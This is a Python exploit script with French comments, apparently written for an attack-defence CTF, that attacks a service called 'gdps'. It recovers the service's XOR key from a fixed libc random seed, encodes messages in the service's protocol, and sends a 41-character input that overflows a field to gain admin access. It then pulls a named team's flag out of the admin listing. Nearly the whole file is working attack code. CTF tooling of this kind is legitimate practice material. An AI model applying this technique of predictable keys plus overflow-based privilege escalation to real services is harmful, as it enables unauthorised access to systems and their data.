#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
import time
import ctypes

if len(sys.argv) != 3 :
    print("Exploit du service gdps\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20137

# Génération de la clé de chiffrement (XOR) grâce au seed obtenu par reverse-engineering
# Le seed étant le même à chaque appel de srand, la clé obtenue par rand est toujours la même
LIBC = ctypes.cdll.LoadLibrary("libc.so.6")
seed = 0xC007F00
nb_rand = 3000
LIBC.srand(seed)
secret_key = ""
for i in range(0, nb_rand) :
 secret_key += chr(LIBC.rand()%256)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

# Chiffrement/déchiffrement par "one-time" pad
def xor_with_secret(message,key) :
 counter = 0
 length = len(message)
 xored_message = ""
 for i in range(0, length) :
   xored_message += chr(ord(message[counter]) ^ ord(key[counter]))
   counter += 1
 return xored_message

# Les messages envoyés entre le client et le serveur sont de la forme LENGTH_MSG_QUI_SUIT (sur 4 bytes) suivi de MESSAGE_XOR_LA_CLE_SECRETE
# Cette fonction sert à décoder les messages reçus par le serveur
def decompose_recv(message,key) :
  if len(message) != 0 :
     first_message_length = ord(message[3])+256*ord(message[2])+256*256*ord(message[1])+256*256*256*ord(message[0])
     first_message = message[4:4+first_message_length]
     rest = message[4+first_message_length:]
     decoded_message = ""
     decoded_message += xor_with_secret(first_message,key)
     decoded_message += decompose_recv(rest,key)
     return decoded_message
  else :
     return ""

# Cette fonction sert à encoder les messages envoyés le serveur
def compose_recv(message, key) :
# print(message)
 length = len(message)
 length_1stbyte = length%256
 length_2ndbyte = (length%(256**2) - length%256)/256
 length_3rdbyte = (length%(256**3) - length%(256**2))/(256**2)
 length_4thbyte = (length - length%(256**3))/(256**3)
 return chr(length_4thbyte)+chr(length_3rdbyte)+chr(length_2ndbyte)+chr(length_1stbyte)+xor_with_secret(message, secret_key)
     


try :
  time.sleep(0.1)
  ack = s.recv(4096)

  s.send(compose_recv('l', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)

# Overflow avec une chaîne de 41 caractères ou plus
  s.send(compose_recv('41 random characters is all i need !!!!!!', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)

  s.send(compose_recv('a', secret_key))
  time.sleep(0.1)
  ack = s.recv(99999)
  response = decompose_recv(ack,secret_key)
  target_occurence = response.find("Name: "+target+'\nSource IP')
  if target_occurence != -1 :
    target_infos = response[target_occurence:]
    flag_occurence = target_infos.find("Comment: ")
    flag_beginning = target_infos[flag_occurence:]
    end_of_flag_occurence = flag_beginning.find("\n")
    print(flag_beginning[9:end_of_flag_occurence])
  else :
    print("No flag set for this name")
    





# Pour set un flag, décommenter les 5 blocs suivants

  """s.send(compose_recv('s', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)
  print(decompose_recv(ack, secret_key))

# Le propriétaire du flag
  s.send(compose_recv('target', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)
  print(decompose_recv(ack, secret_key))

  s.send(compose_recv('1.2.3.4', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)
  print(decompose_recv(ack, secret_key))

  s.send(compose_recv('5.6.7.8', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)
  print(decompose_recv(ack, secret_key))

  s.send(compose_recv('FLAG_GDPS', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)
  print(decompose_recv(ack, secret_key))"""


# Si on décommente le bloc suivant on accède à la liste complète des commandes
# La fonction "show all" apparaît : On est admin !

  """s.send(compose_recv('h', secret_key))
  time.sleep(0.1)
  wtf_ack = s.recv(4096)
#  print(decompose_recv(wtf_ack, secret_key))

  s.send(compose_recv('a', secret_key))
  time.sleep(0.1)
  wtf_ack = s.recv(99999)
#  print(decompose_recv(wtf_ack, secret_key))"""

  s.send(compose_recv('q', secret_key))
  time.sleep(0.1)
  ack = s.recv(4096)


except socket.error:
  print("Erreur lors de l'envoi")
  sys.exit()
